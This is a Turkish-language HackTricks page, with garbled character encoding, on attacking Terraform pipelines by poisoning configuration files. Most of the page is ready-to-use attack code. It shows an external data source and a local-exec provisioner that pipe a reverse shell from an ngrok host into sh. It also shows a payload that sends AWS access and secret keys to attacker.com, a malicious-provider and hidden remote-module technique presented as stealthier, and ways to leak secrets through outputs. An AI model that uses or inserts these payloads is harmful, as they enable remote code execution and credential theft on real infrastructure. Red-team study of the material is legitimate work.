# Terraform GÃ¼venliÄŸi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

[DÃ¶kÃ¼mantasyondan: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, **insan tarafÄ±ndan okunabilir yapÄ±landÄ±rma dosyalarÄ±nda** bulut ve yerinde kaynaklarÄ± tanÄ±mlamanÄ±za, sÃ¼rÃ¼mlemenize, yeniden kullanmanÄ±za ve paylaÅŸmanÄ±za olanak tanÄ±yan bir **altyapÄ± kodu aracÄ±dÄ±r**. ArdÄ±ndan, altyapÄ±nÄ±zÄ±n yaÅŸam dÃ¶ngÃ¼sÃ¼ boyunca tutarlÄ± bir iÅŸ akÄ±ÅŸÄ± kullanarak tÃ¼m altyapÄ±nÄ±zÄ± oluÅŸturmayÄ± ve yÃ¶netmeyi saÄŸlayabilirsiniz. Terraform, hesaplama, depolama ve aÄŸ kaynaklarÄ± gibi dÃ¼ÅŸÃ¼k seviye bileÅŸenleri, DNS giriÅŸleri ve SaaS Ã¶zellikleri gibi yÃ¼ksek seviye bileÅŸenleri yÃ¶netebilir.

### Terraform nasÄ±l Ã§alÄ±ÅŸÄ±r?

Terraform, bulut platformlarÄ±nda ve diÄŸer hizmetlerde kaynaklarÄ± ve hizmetleri uygulama programlama arayÃ¼zleri (API'ler) aracÄ±lÄ±ÄŸÄ±yla oluÅŸturur ve yÃ¶netir. SaÄŸlananlar, Terraform'un eriÅŸilebilir bir API'ye sahip neredeyse herhangi bir platform veya hizmetle Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar.

![](<../.gitbook/assets/image (33).png>)

HashiCorp ve Terraform topluluÄŸu, **1700'den fazla saÄŸlayÄ±cÄ±** yazmÄ±ÅŸtÄ±r ve binlerce farklÄ± tÃ¼rde kaynak ve hizmeti yÃ¶netmek iÃ§in bu sayÄ± sÃ¼rekli olarak artmaktadÄ±r. Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birÃ§ok saÄŸlayÄ±cÄ±yÄ± iÃ§eren tÃ¼m genel olarak kullanÄ±labilir saÄŸlayÄ±cÄ±larÄ± [Terraform KayÄ±t Defteri](https://registry.terraform.io/)nde bulabilirsiniz.

Temel Terraform iÅŸ akÄ±ÅŸÄ± Ã¼Ã§ aÅŸamadan oluÅŸur:

* **Yazma:** Birden fazla bulut saÄŸlayÄ±cÄ± ve hizmet Ã¼zerinde olabilecek kaynaklarÄ± tanÄ±mlarsÄ±nÄ±z. Ã–rneÄŸin, bir uygulamayÄ± sanal makinelerde bir Sanal Ã–zel AÄŸ (VPC) aÄŸÄ±ndaki gÃ¼venlik gruplarÄ± ve bir yÃ¼k dengeleyici ile daÄŸÄ±tmak iÃ§in bir yapÄ±landÄ±rma oluÅŸturabilirsiniz.
* **Planlama:** Terraform, mevcut altyapÄ± ve yapÄ±landÄ±rmanÄ±za dayanarak oluÅŸturacaÄŸÄ±, gÃ¼ncelleyeceÄŸi veya yok edeceÄŸi altyapÄ±yÄ± tanÄ±mlayan bir yÃ¼rÃ¼tme planÄ± oluÅŸturur.
* **Uygulama:** OnaylandÄ±ÄŸÄ±nda, Terraform Ã¶nerilen iÅŸlemleri doÄŸru sÄ±rayla gerÃ§ekleÅŸtirir ve herhangi bir kaynak baÄŸÄ±mlÄ±lÄ±ÄŸÄ±nÄ± dikkate alÄ±r. Ã–rneÄŸin, bir VPC'nin Ã¶zelliklerini gÃ¼ncellerseniz ve bu VPC'deki sanal makine sayÄ±sÄ±nÄ± deÄŸiÅŸtirirseniz, Terraform, sanal makineleri Ã¶lÃ§eklendirmeden Ã¶nce VPC'yi yeniden oluÅŸturur.

![](<../.gitbook/assets/image (81).png>)

## Terraform LaboratuvarÄ±

Sadece bilgisayarÄ±nÄ±za terraform kurun.

Ä°ÅŸte [kÄ±lavuz](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve burada [terraform'Ä± indirmenin en iyi yolu](https://www.terraform.io/downloads) bulunmaktadÄ±r.

## Terraform'da Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

Terraform'un **bir web sayfasÄ± veya aÄŸ hizmeti sunan bir platformu yoktur** bu yÃ¼zden sayÄ±labilecek bir ÅŸey yoktur, bu nedenle terraform'Ä± **etkileyebilmek iÃ§in terraform yapÄ±landÄ±rma dosyalarÄ±nÄ± eklemek/deÄŸiÅŸtirmek** gerekmektedir.

Ancak, terraform, dÃ¼zgÃ¼n Ã§alÄ±ÅŸabilmesi iÃ§in farklÄ± konumlara **Ã¶zel eriÅŸim** saÄŸlayacaÄŸÄ±ndan, terraform'Ä±n **Ã§ok hassas bir bileÅŸen** olduÄŸunu unutmamak Ã¶nemlidir.

Bir saldÄ±rganÄ±n terraform'Ä±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± sistemi etkileyebilmesi iÃ§in **terraform yapÄ±landÄ±rma dosyalarÄ±nÄ± depolayan depoyu etkilemesi** en yaygÄ±n yol olacaktÄ±r, Ã§Ã¼nkÃ¼ bir noktada bu dosyalar **yorumlanacak**tÄ±r.

AslÄ±nda, **Atlantis** gibi bir PR oluÅŸturulduktan sonra otomatik olarak `terraform plan/apply` komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±ran Ã§Ã¶zÃ¼mler bulunmaktadÄ±r:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Bir terraform dosyasÄ±nÄ± etkileyebiliyorsanÄ±z, birisi `terraform plan` veya `terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nda RCE gerÃ§ekleÅŸtirmek iÃ§in farklÄ± yÃ¶ntemler bulunmaktadÄ±r.

### Terraform plan

Terraform plan, terraform'da **en Ã§ok kullanÄ±lan komuttur** ve geliÅŸtiriciler/terraform kullanan Ã§Ã¶zÃ¼mler bunu sÃ¼rekli Ã§aÄŸÄ±rÄ±r, bu yÃ¼zden RCE elde etmenin **en kolay yolu**, bir terraform yapÄ±landÄ±rma dosyasÄ±nÄ± zehirlemek ve `terraform plan` komutunda keyfi komutlar Ã§alÄ±ÅŸtÄ±rmaktÄ±r.

#### Harici bir saÄŸlayÄ±cÄ± kullanma

Terraform, Terraform ve harici programlar arasÄ±nda bir arayÃ¼z saÄŸlayan [`external` saÄŸlayÄ±cÄ±yÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. Bir `plan` sÄ±rasÄ±nda keyfi kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in `external` veri kaynaÄŸÄ±nÄ± kullanabilirsiniz.

AÅŸaÄŸÄ±daki gibi bir terraform yapÄ±landÄ±rma dosyasÄ±na enjekte edilen ÅŸey, `terraform plan` komutu Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir ters kabuk Ã§alÄ±ÅŸtÄ±racaktÄ±r:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Ã–zel bir saÄŸlayÄ±cÄ± kullanma

Bir saldÄ±rgan, [Ã¶zel bir saÄŸlayÄ±cÄ±yÄ±](https://learn.hashicorp.com/tutorials/terraform/provider-setup) [Terraform KayÄ±t Defteri'ne](https://registry.terraform.io/) gÃ¶nderebilir ve ardÄ±ndan bunu Terraform koduna bir Ã¶zellik dalÄ±nda ekleyebilir ([buradan Ã¶rnek](https://alex.kaskaso.li/post/terraform-plan-rce)).
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
SaÄŸlayÄ±cÄ± `init` sÄ±rasÄ±nda indirilir ve `plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kÃ¶tÃ¼ amaÃ§lÄ± kodu Ã§alÄ±ÅŸtÄ±rÄ±r

Bir Ã¶rneÄŸi [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

#### Harici bir referans kullanma

Bahsedilen her iki seÃ§enek de kullanÄ±ÅŸlÄ±dÄ±r, ancak Ã§ok gizli deÄŸildir (ikincisi birincisinden daha gizli, ancak daha karmaÅŸÄ±ktÄ±r). Bu saldÄ±rÄ±yÄ± daha **gizli bir ÅŸekilde** gerÃ§ekleÅŸtirebilirsiniz, aÅŸaÄŸÄ±daki Ã¶nerilere uyarak:

* Terraform dosyasÄ±na doÄŸrudan rev shell eklemek yerine, rev shell iÃ§eren bir **harici kaynaÄŸÄ± yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* DÄ±ÅŸ kaynakta, **terraform rev shell kodunu bir dal iÃ§inde** gizlemek iÃ§in **ref** Ã¶zelliÄŸini kullanÄ±n, Ã¶rneÄŸin: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

TÃ¼m deÄŸiÅŸiklikleri uygulamak iÃ§in Terraform apply komutu kullanÄ±lÄ±r, aynÄ± zamanda **yerel yÃ¼rÃ¼tme** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile** **kÃ¶tÃ¼ niyetli bir Terraform dosyasÄ± enjekte ederek RCE elde etmek iÃ§in de kullanÄ±labilir**.\
Sadece aÅŸaÄŸÄ±daki gibi bir payload'Ä±n `main.tf` dosyasÄ±nda yer aldÄ±ÄŸÄ±ndan emin olmanÄ±z gerekmektedir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
## SÄ±zÄ±ntÄ±lar

Terraform dosyasÄ±na aÅŸaÄŸÄ±daki gibi bir ÅŸey ekleyerek, `terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rarak Terraform tarafÄ±ndan kullanÄ±lan gizli deÄŸerleri sÄ±zdÄ±rabilirsiniz:

```hcl
data "external" "secrets" {
  program = ["sh", "-c", "echo 'secretpassword'"]
}

output "secrets" {
  value = data.external.secrets.result
}
```

Bu Ã¶rnekte, `secretpassword` adlÄ± bir gizli deÄŸer dÄ±ÅŸa aktarÄ±lÄ±yor. Bu deÄŸeri gerÃ§ek bir gizli deÄŸerle deÄŸiÅŸtirmeniz gerekmektedir.
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Denetim AraÃ§larÄ±

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzun statik analizini kullanarak potansiyel yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit eder.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan, AltyapÄ± olarak Kod iÃ§in bir statik kod analiz aracÄ±dÄ±r.

## Referanslar

* [Atlantis GÃ¼venliÄŸi](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
